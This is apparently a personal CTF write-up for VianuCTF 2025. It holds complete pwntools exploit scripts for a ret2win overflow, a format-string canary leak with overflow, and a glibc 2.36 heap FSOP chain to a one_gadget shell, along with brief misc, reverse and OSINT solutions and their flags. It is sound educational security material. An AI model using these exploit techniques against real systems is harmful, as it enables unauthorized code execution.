+++
date = '2025-12-16'
draft = false
title = "VianuCTF 2025"
ShowToc = true
tags = ["CyberEdu", "pwn", "buffer-overflow", "Ret2libc", "JOP"]
+++

## Introduction

This is my writeup for the challenges I solved during the VianuCTF 2025 edition, big thank you to the challenge writers, organizers and everyone else involved in this! Was a fun ctf overall, unluckily overlapping with the math finals simulation, so I only had about three hours left to try solving some challenges. 

Enough talking, here is what I solved:

## Christmas PIE - pwn

![challenge-screenshot](pic1.png#center)

As spoiled by the title, we're dealing with a 64-bit PIE, and we get the address of `main` upon running the binary.

![challenge-screenshot](pic2.png#center)

Taking a look at the decompiled code, first thing we see is a buffer overflow and a win function. So classic ret2win. We can parse `main`, calculate the address of `win` and overwrite the return with `win`. 

The final script looks like this:

```python

from pwn import *
elf = ELF('/home/kali/Downloads/christmas_pie')
p=elf.process()
p=remote('34.179.139.43', 30353)

p.recvuntil(b': ')

main = int(p.recvline().strip(), 16)
print(hex(main))

#base + 0x12CF = main
#base + 0x11FA = win
#win = main - 0x12CF + 0x11FA
#win = main - 0xD5

win = main-0xD5

#buf
payload = b'A' * 80
#rbp
payload +=  b'\x90'*8

payload += p64(win)
p.sendline(payload)

p.interactive()

```

The flag: CTF{CHR1STM4S_P13_G1V3S_Y0U_SH3LL}

---

## Santa's little pwner - pwn 

Just like the challenge before it, we're working with a 64-bit PIE, except with a little more restrictions this time. Also similarly to **Christmas PIE**, we have a `win` function inside of our binary.

In this challenge, we get to name two elves, whose names are plainly printed back to us, so immediately, this means format string vulnerability. 

![challenge-screenshot](pic3.png#center)

The restrictions I was talking about are - as you might see in the `v4 = __readfsqword(0x28u);` - a canary! But since we have a fmtstr vuln we can find out what the canary is and be careful not to overwrite it.

And since we're working with PIE, we also need to leak a function inside our binary to get `win`. This is to use the buffer overflow in `s` to redirect to `win`. Since this function is called twice, the first time it's called, we can leak our addresses and the second time form our payload. I found the canary at `%43$p` on the stack, and a binary address at an `0x43` offset from `win` at `%21$p`.

The final script:

```python

from pwn import *
elf = ELF('/home/kali/Downloads/santas_little_pwner')
p=elf.process()
p=remote('34.89.226.167', 30593)

p.recvuntil(b': ')

p.sendline(b'%43$p %21$p')
#get canary  + main

canary = int(p.recvn(18), 16)
p.recvuntil(b' ')
main_leak = int(p.recvn(14), 16)
win = main_leak + 0x43
print(hex(canary))
print(hex(win))

p.recvuntil(b': ')

payload = b'A'*72 + p64(canary) + b'B'*8 + p64(win)
p.sendline(payload)

p.interactive()

```

The flag: CTF{wh0_15_4_g00d_b0y_pwn3r}

---

## DSN - pwn

Sadly I didn't get to finish this in time for the ctf, but I though I could make a writeup for this anyways, as it had zero solves. So keep in mind, the script isn't mine, but I will do my best to explain everything that's happening. TLDR, this is [FSOP](https://dangokyo.wordpress.com/2018/01/01/advanced-heap-exploitation-file-stream-oriented-programming/).

Anyways, this challenge is a bit more complicated than the other ones, and also *heap*, so twice as bad. So let's take a look at it step by step.
First, we're dealing with every restriction possible, including full RelRO, except canary. And the `glibc` version for this chall is `2.36`, keep that in mind.

We have an app folder, with a `chall` and `flag.txt` inside, and a lib folder with a `libc.so.6` and a `ld.so`.

![challenge-screenshot](pic4.png#center)

In our `main`, we have, of course, a menu, and five options to choose from: `establish_link`, `terminate_link`, `download_telemetry`, `upload_commands` and `exit`.

Using a global array, in this case marked as `qword_5080`, we can maintain two *probes* like so: `[ probe0_buf | probe0_size | probe1_buf | probe1_size ]`.



![challenge-screenshot](pic5.png#center)

In `establish_link`, we essentially allocate a heap chunk for a *probe*. We're given a size range (1280 to 4096), and the pointer and size are stored in `qword_5080`.

![challenge-screenshot](pic6.png#center)

In `terminate_link`, we simply free the heap chunk, clear the pointer, but don't check whether the buffer is still in use by the signal handler (more on that later).

![challenge-screenshot](pic7.png#center)

In `download_telemetry`, the only important line is `puts(qword_5080[id])`.

![challenge-screenshot](pic8.png#center)

In `upload_commands`, things start to get a little more interesting. We can translate this into something like: 

```python
int upload_commands() {
  Probe ID
  read(0, staging, size)
  active_buf = probe_buf
  active_len = bytes_read
  alarm(3)
}
```

This `active_buf` and `active_len` are `qword_5068` and `qword_5060`. This is because `read` returns the number of bytes read. And in this case `active_buf` points directly to the probe's heap buffer. 

The signal I mentioned previously is triggered at the end of this alarm, and executes:

```python
memcpy(active_buf, staging, active_len)
```

Where we control the length. So obviously that `alarm` is completely out of place; This function is going to be our main issue for this challenge.


![challenge-screenshot](pic9.png#center)

We also have a `handler` function, which looks like so:

```python
void handler() {
  if (active_buf)
    memcpy(active_buf, staging, active_len);
  active_buf = NULL;
}
```

And this runs asynchronously after `alarm(3)`. So this writes even after the buffer was freed, because it doesn't really check anything properly. So this means we have an **async UAF primitive** at hand.

---

So we're looking at a couple of vulnerabilities: this async UAF (Use-After-Free) which is more of a Write-After Free:

- `upload_commands()` to set `active_buf`

- `terminate_link` to free it

- `handler` to write to freed memory

Then we also have a heap overflow, which was apparently unintended but it exists anyways, since we can make that `active_len` pretty big. 

Since, as previously mentioned, we're dealing with `glibc 2.36`, hooks are removed and RelRO is full so we can't overwrite GOT, we have to do something else. 

There is something we can do, though, called **glibc FILE structure exploitation**. **[Here](https://gsec.hitb.org/materials/sg2018/WHITEPAPERS/FILE%2520Structures%2520-%2520Another%2520Binary%2520Exploitation%2520Technique%2520-%2520An-Jie%2520Yang.pdf)** is a great in-depth resource that talks about it, but I'll try to explain it broadly.

First, what is a glibc `FILE`? In C, internally, it looks something like:

```python
struct _IO_FILE_plus {
    _IO_FILE file;
    const struct _IO_jump_t *vtable;
};
```

`_IO_FILE` is the state, so the buffer pointers, and the `vtable` is function pointers for I/O operations.

So the `vtable` is a structure of function pointers that define *how* this stream should behave when I/O happens. And the `_IO_FILE` contains the data.

Luckily, `glibc` keeps a global linked list of all the open FILEs, `_IO_list_all`. This includes stdin, stdout, and every open `fopen()` file.

When our program exits or flushes streams, glibc runs `_IO_flush_all_lockp()`.

This then does 

```python
for each file in _IO_list_all:
    file->vtable->overflow(file, EOF)
```

Or `_IO_list_all → stdout → stderr → stdin → ...`.

So what we want to do, is insert a fake FILE into `_IO_list_all` and control its `vtable` to call a function pointer we can control. Essentially we overwrite a 'FILE' pointer (anything opened by `fopen()`) to our own forged structure. (This is, obviously, patched in newer libc versions).

Problem is we can't make a fake vtable, because glibc verifies it and aborts when something's fishy.

So in `file->vtable->overflow(file, EOF);` our exploit is going to look like:

- `file` is our fake `_IO_FILE`

- `vtable` is a legitimate vtable that already exists like `_IO_wfile_jumps`

- `overflow()` to a glibc function that reads from `file`.

What we want to jump to is a `one_gadget`, so a piece of shellcode that would just take care of everything and get us a shell.

---

Alright, now that that's out of the way, let's start actually working on our exploit. First, we want to leak `libc`, and we're going to have to mess around with allocations for that.

So first let's set it up. 

```python
a = 0, b = 1
alloc(a, 0x558)
alloc(b, 0x500)
```

Because both these sizes are larger than the tcache max, they would both go into the unsorted bin, and they don't get merged because of the different sizes. So now the heap looks like `[ chunk A (0x558) ][ chunk B (0x500) ][ top chunk ]`.

Now, we need to leak a pointer into `main_arena` to compute the libc base.

```python
free(a)
alloc(a, 0x700)
```

This frees our `a`, and as previously said, it goes into the unsorted bin, and it's `fd` and `bk` pointers are set to `main_arena + 0x60`. After allocating a bigger size, glibc will reuse it, and leftover metadata will still contain some libc pointers.

Basically the new allocated chunk looks like so:

`+0x00  main_arena+0x60`

`+0x08  main_arena+0x60`

`main-arena` is inside libc so any pointer to it is a libc pointer. Then we can use `upload_telemetry` to change one byte into something like an *A* and then `download_telemetry` to output the actual `libc` address. 

---

We have `libc`, now we need to get the heap base. Similarly, we overwrite using `upload_telemetry` so that our chunk looks like this:

`+0x00  AAAAAAAA`

`+0x08  AAAAAAAA`

`+0x10  heap pointer`

Then we can get it using `download_telemetry`.

The script up to now looks like this, first the helper functions:

```python
def alloc(idx, size):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Probe ID: ', str(idx).encode())
    io.sendlineafter(b'Buffer size: ', str(size).encode())

def free(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Probe ID: ', str(idx).encode())

def read_buf(idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'Probe ID: ', str(idx).encode())
    return io.recvline()

def write_buf(idx, data):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'Probe ID: ', str(idx).encode())
    io.sendafter(b'Data: ', data)

def wait_for_write():
    io.recvuntil(b"received!\n")
    io.sendline(b'0')
    
```

Then the leaks:

```python
a, b = 0, 1

alloc(a, 0x558)
alloc(b, 0x500)

free(a)
alloc(a, 0x700)

free(a)
alloc(a, 0x558)   

write_buf(a, b"A")
wait_for_write()

# Leak unsorted bin fd → main_arena
leak = read_buf(a).strip()
libc_leak = u64(leak.ljust(8, b"\x00"))

libc.address = libc_leak - 0x1d2141
log.success(f"libc base @ {hex(libc.address)}")

#heap

# Overwrite first 16 bytes to reach heap pointer
write_buf(a, b"A"*16)
wait_for_write()

leak = read_buf(a).strip()
heap_leak = u64(leak[16:].ljust(8, b"\x00"))

heap_base = heap_leak - 0x290
log.success(f"heap base @ {hex(heap_base)}")
```

---

Now the complicated part. We need to build a fake FILE structure. Luckily pwntools has this tool called `FileStructure` that helps us build a valid `_IO_FILE_plus` layout. We place it inside of the heap, where we control memory. Then, as I said before, we recycle a preexisting vtable.

```python
ch_addr = heap + 0x290
fs = FileStructure(0)

fs.vtable = libc.sym['_IO_wfile_jumps']
```

Next, the `one_gadget`. Using the `libc.so.6` file we get:

![challenge-screenshot](pic10.png#center)

We can add this along with `_lock`, which is required for safety, importantly just writeable memory that won't crash. Similarly, `_wide_data`.

```python
fs.markers = libc.address + 0xd3361  # one_gadget
fs._lock = ch_addr + 0x10
fs._wide_data = ch_addr - 0x18

#next some padding
fs.unknown2 = (
    p64(0) * 4 +
    p64(ch_addr - 0x8) +
    p64(0)
)
```

Next we overwrite `_IO_list_all` by freeing a corrupted FILE chunk.

```python
chunk[0x18:0x20] = p64(libc.sym['_IO_list_all'] - 0x20)
fake_chunk->fd = &_IO_list_all - 0x20
fd->bk = bk;
_IO_list_all = fake_FILE;
```

Upon freeing this chunk with another `free(a)`, glibc is going to call `_IO_flush_all_lockp`.

Then we need to free the second probe to force glibc to walk the FILE list:

```python
free(b)
alloc(b, 0x500)
```

And finally, triggering another I/O operation causes glibc to flush streams:

```python
write(a, b'x')
io.sendlineafter(b'> ', b'4')
io.sendlineafter(b': ', str(b).encode())
```

After everything is said and done, our `one_gadget` is going to get triggered and grant us a shell.

So the end of the script:

```python
chunk = bytearray(bytes(fs)[0x10:].ljust(0x558, b'\x00'))
chunk[0x18:0x20] = p64(libc.sym['_IO_list_all'] - 0x20)
#→ _IO_list_all = fake_FILE

chunk[0x528:0x540] = p64(0x31) + p64(heap + 0x7c0) * 2

#prev_size = 0x31
#size      = 0x31
#fd = heap+0x7c0
#bk = heap+0x7c0

#this makes the chunk look like a valid smallbin chunk pointing to controlled heap memory
#just make it look normal

chunk[0x550:0x558] = p64(0x30)

#another anticrash thing

chunk = bytes(chunk)

write(a, chunk)
free(a)

##here, _IO_list_all = fake_FILE

alloc(a, 0x700)
wait_for_write()

#heap state stabilization

free(b)
alloc(b, 0x500)

#trigger a free that runs our payload 

write(a, b'x')

io.sendlineafter(b'> ', b'4')
io.sendlineafter(b': ', str(b).encode())

io.interactive() 
```

And here is proof that it actually works:

![challenge-screenshot](pic11.png#center)

Again, credits to Iacob Razvan Mihai for coming up with this challenge and for the script. 


## Santa - misc

This was an easy challenge, consisting of a Santa AI chatbot, with the description *Did santa give you a present this year, you **little helper?*** (*little helper* in bold). So I thought they must've bolded that for a reason, and upon entering the phrase *little helper* as input for the chatbot, we get the flag.

The flag: Vianu_CTF(s4nt4_g4ve_you_a_pr3s3n7_T00?)


---

## C it's Still a Thing in 2025 - Reverse Engineering

If we open the binary with IDA, we immediately get the flag as plaintext.

The flag: CTF{b2d7f24e833051d5fc296d4a747281e9d155ecfb636b983cfd70b51ed9b45a32}

---

## Find It - OSINT

The description for this challenge was *Find the hidden secret in a photo uploaded by N0th1ngUs3r on a platform that starts with "F".*. The platform for this was Flickr, some image sharing forum, and after finding the user, we find QR code that they posted, which leads to the flag upon scanning. 

The flag: CTF{fd3d13ac301958102d1e1038d6a6b0b2e743561b9e31446f42b1d2f32aabeb06}
